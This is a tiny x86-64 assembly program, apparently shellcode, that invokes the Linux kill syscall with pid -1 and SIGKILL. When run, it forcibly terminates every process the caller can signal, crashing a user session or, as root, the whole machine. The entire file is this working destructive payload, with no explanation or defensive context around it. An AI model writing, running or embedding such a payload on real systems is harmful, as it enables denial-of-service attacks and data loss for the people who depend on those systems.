
global _start

section .text

_start:
    
	    
	push 	0x3e		; sys kill
	pop  	rax
	push 	-1 			; pid
	pop		rdi
	push	0x9			; sig kill
	pop 	rsi
	syscall

